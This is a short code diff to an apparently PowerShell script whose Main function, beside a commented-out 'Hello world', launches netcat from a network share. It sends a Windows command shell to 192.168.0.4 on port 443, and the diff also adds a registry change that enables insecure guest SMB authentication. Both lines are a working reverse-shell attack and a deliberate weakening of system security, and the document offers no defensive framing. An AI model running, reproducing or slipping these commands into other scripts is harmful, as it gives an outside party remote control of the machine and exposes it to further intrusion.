@@ -15,6 +15,7 @@ function Main
 
     #echo "Hello world"
 
-    cmd /c \\192.168.0.4\gualdronsito\netcat\nc.exe -e cmd 192.168.0.4 443
+    reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\LanmanWorkstation\Parameters" /v "AllowInsecureGuestAuth" /t "REG_DWORD" /d "1" /f;
+    cmd /c \\192.168.0.4\gualdronsito\netcat\nc.exe -e cmd.exe 192.168.0.4 443;
 }
 Main
